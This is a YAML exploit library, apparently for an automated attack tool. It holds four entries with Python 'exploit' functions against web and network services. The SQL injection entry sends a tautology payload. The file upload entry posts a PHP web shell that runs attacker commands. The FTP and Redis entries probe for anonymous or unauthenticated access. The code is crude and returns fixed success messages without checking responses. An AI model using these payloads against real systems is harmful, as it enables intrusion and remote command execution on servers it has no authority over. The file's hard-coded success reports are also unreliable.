web_sqli:
  name: "SQL Injection"
  type: "web"
  risk: "high"
  port: 80
  description: "SQL injection attack"
  code: |
    import requests
    
    def exploit(target, param):
        payload = "' OR '1'='1' -- "
        url = f"{target}?{param}={payload}"
        response = requests.get(url)
        return "SQLi attempted"

web_upload:
  name: "File Upload"
  type: "web" 
  risk: "critical"
  port: 80
  description: "Upload web shell"
  code: |
    import requests
    
    def exploit(target, file_param):
        shell_code = "<?php system($_GET['cmd']); ?>"
        files = {file_param: ('shell.php', shell_code)}
        response = requests.post(target, files=files)
        return "Shell uploaded"

ftp_anon:
  name: "FTP Anonymous"
  type: "network"
  risk: "medium"
  port: 21
  description: "Anonymous FTP access"
  code: |
    import socket
    
    def exploit(target):
        try:
            sock = socket.socket()
            sock.connect((target, 21))
            sock.send(b"USER anonymous\r\n")
            response = sock.recv(1024)
            return "FTP tested"
        except:
            return "FTP failed"

redis_unauth:
  name: "Redis Unauthorized"
  type: "network"
  risk: "high" 
  port: 6379
  description: "Redis unauthorized access"
  code: |
    import socket
    
    def exploit(target):
        try:
            sock = socket.socket()
            sock.connect((target, 6379))
            sock.send(b"PING\r\n")
            response = sock.recv(1024)
            return "Redis accessible"
        except:
            return "Redis failed"
